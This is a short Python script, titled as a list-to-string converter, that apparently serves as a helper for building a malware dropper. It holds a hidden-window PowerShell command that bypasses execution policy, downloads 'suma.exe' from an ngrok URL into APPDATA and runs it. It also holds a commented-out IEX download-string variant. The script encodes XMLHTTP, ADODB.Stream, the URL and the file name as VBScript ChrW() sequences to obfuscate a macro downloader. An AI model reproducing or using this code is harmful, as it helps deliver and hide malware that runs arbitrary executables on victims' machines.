# Python program to convert a list to string
    
# Function to convert  
def listToString(s): 
    
    # initialize an empty string
    str1 = "" 
    
    # traverse in the string  
    for ele in s: 
        str1 += ele  
    
    # return string  
    return str1 

#input = "powershell.exe \"IEX ((new-object net.webclient).downloadstring('http://867610452d3a.ngrok.io/example/suma.exe'))\""
input = "powershell.exe -command PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile('http://6c6d3d44bd7c.ngrok.io/example/suma.exe',\"$env:APPDATA\$ProcName\");Start-Process (\"$env:APPDATA\suma.exe\")"
# https://gist.github.com/Porama6400/e1b724428f29c8f0726e6fe1328ecbc4

in1 = "Microsoft.XMLHTTP"
in2 = "Adodb.Stream"
in3 = "GET"
in4 = "http://6c6d3d44bd7c.ngrok.io/example/suma.exe"
in5 = "suma.exe"
out1 = ['ChrW('+str(ord(l))+')&' for l in in1]
out2 = ['ChrW('+str(ord(l))+')&' for l in in2]
out3 = ['ChrW('+str(ord(l))+')&' for l in in3]
out4 = ['ChrW('+str(ord(l))+')&' for l in in4]
out5 = ['ChrW('+str(ord(l))+')&' for l in in5]

print(listToString(out1))
print("---")
print(listToString(out2))
print("---")
print(listToString(out3))
print("---")
print(listToString(out4))
print("---")
print(listToString(out5))
	